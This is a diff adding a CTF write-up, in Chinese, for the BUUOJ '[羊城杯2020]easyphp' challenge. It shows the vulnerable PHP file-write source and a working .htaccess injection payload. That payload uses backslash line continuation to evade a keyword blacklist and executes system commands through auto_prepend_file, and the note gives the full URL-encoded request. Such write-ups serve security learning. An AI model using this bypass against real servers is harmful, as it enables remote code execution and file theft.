@@ -10435,6 +10435,71 @@ SVG，可缩放矢量图形（Scalable Vector Graphics），是一种用于描�
 
 ![img](CTF.assets/format,png-17162903931293.png)
 
+## BUUOJ [羊城杯2020]easyphp
+
+```php
+<?php
+    $files = scandir('./'); 
+	# 删除所有当前目录下除了 index.php 的文件
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {
+                unlink($file);
+            }
+        }
+    }
+    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
+        highlight_file(__FILE__);
+        die();
+    }
+	# 文件内容黑名单过滤
+    $content = $_GET['content'];
+    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
+        echo "Hacker";
+        die();
+    }
+	# 文件名只能有 a-z和.
+    $filename = $_GET['filename'];
+    if(preg_match("/[^a-z\.]/", $filename) == 1) {
+        echo "Hacker";
+        die();
+    }
+	# 再次删除所有当前目录下除了 index.php 的文件
+    $files = scandir('./'); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== "index.php") {
+                unlink($file);
+            }
+        }
+    }
+    file_put_contents($filename, $content . "\nHello, world");
+?>
+```
+
+可以用`.htaccess`做命令执行，可以看看葵花宝典有关`.htaccess`的技巧：
+
++ 使用`\`做换行绕过`file`的过滤
++ 最后的`\`是为了配合`file_put_contents()`的`\n`，不然会报错
+
+```
+php_value auto_append_fi\
+le .htaccess
+#<?php system('ls');?>\
+```
+
+这里由于会自做文件删除，所以在访问上不能只访问`index.php`，需要带上payload一起访问才行
+
+```
+filename=.htaccess&content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system('cat /fla?')%3B%3F%3E%5C
+```
+
+
+
+
+
+
+
 # Misc
 
 ## János-the-Ripper-隐写-压缩包密码破解
